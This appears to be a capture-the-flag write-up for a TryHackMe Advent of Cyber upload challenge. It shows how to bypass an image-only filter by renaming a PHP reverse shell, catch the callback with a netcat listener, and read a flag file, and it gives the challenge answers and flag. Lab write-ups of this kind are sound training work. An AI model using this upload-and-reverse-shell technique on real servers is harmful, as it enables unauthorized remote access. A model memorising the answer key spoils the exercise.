# TryHackMe Advent of Cyber Day 1
### References
* DarkSec. (2020). TryHackMe Advent of Cyber 2: Day 2 [YouTube Video]. In YouTube. https://youtu.be/F_nTIX-q32k
* pentestmonkey. (2015, May 29). pentestmonkey/php-reverse-shell. GitHub. https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php

## What string of text needs adding to the URL to get access to the upload page?
**Answer**: `?id=ODIzODI5MTNiYmYw`
## What type of file is accepted by the site?
From the website's HTML `body > main`:
```html
<main>
	<h1>Protect the Factory!</h1>
	<h2>If you see any suspicious people near the factory, take a picture and upload it here!</h2>
	<input type=file id="chooseFile" accept=".jpeg,.jpg,.png">
	<button tabindex=0 id=coverFile>Select</button>
	<button tabindex=1 id=uploadFile>Submit</button>
	<p id=fileText>No file selected</p>
</main>
```
**Answer**: The website accepts an `image`.
## In which directory are the uploaded files stored?
By trial and error:
* `/uploads`
* `/images`
* `/media`
* `/resources`

**Answer**: `/uploads`
## What is the flag in `/var/www/flag.txt`?
1. Download the [PHP file](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) written by @pentestmonkey.
2. Modify the `$ip` variable to your TryHackMe IP address (green bubble on the navbar), and the `$port` variable to `443`.
```php
$ip = '<OPENVPN_IP>';
$port = 443;
```
3. Rename the PHP file to include `.jpeg`, `.jpg` or `.png`.
4. Run `sudo nc -lvnp 443` and leave process running.
5. Upload renamed PHP file.
6. Navigate to `/uploads/?id=ODIzODI5MTNiYmYw`.
7. Click on PHP file.
![](uploads.jpg)
8. In the `nc` process, run `cat /var/www/flag.txt` from the reverse shell.
```
==============================================================


You've reached the end of the Advent of Cyber, Day 2 -- hopefully you're enjoying yourself so far, and are learning lots! 
This is all from me, so I'm going to take the chance to thank the awesome @Vargnaar for his invaluable design lessons, without which the theming of the past two websites simply would not be the same. 


Have a flag -- you deserve it!
THM{MGU3Y2UyMGUwNjExYTY4NTAxOWJhMzhh}


Good luck on your mission (and maybe I'll see y'all again on Christmas Eve)!
 --Muiri (@MuirlandOracle)


==============================================================
```
**Flag**: `THM{MGU3Y2UyMGUwNjExYTY4NTAxOWJhMzhh}`